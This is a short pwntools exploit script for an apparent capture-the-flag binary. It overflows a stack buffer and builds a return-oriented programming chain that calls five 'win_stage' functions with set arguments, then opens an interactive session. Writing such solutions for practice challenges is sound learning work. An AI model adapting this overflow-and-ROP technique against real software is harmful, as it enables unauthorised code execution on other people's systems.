from pwn import *

binary = args.BIN

e = context.binary = ELF(binary)
r = ROP(e)

p = process(e.path)

chain = cyclic(72) 
chain += p64(0x0402c63)            # pop rdi ; ret
chain += p64(0x1)                  # set register
chain += p64(e.sym['win_stage_1']) # call the function

chain += p64(0x0402c63)            # pop rdi ; ret
chain += p64(0x2)                  # set register
chain += p64(e.sym['win_stage_2']) # call the function

chain += p64(0x0402c63)            # pop rdi ; ret
chain += p64(0x3)                  # set register
chain += p64(e.sym['win_stage_3']) # call the function

chain += p64(0x0402c63)            # pop rdi ; ret
chain += p64(0x4)                  # set register
chain += p64(e.sym['win_stage_4']) # call the function

chain += p64(0x0402c63)            # pop rdi ; ret
chain += p64(0x5)                  # set register
chain += p64(e.sym['win_stage_5']) # call the function

p.sendlineafter(b'address).', chain)

p.interactive()
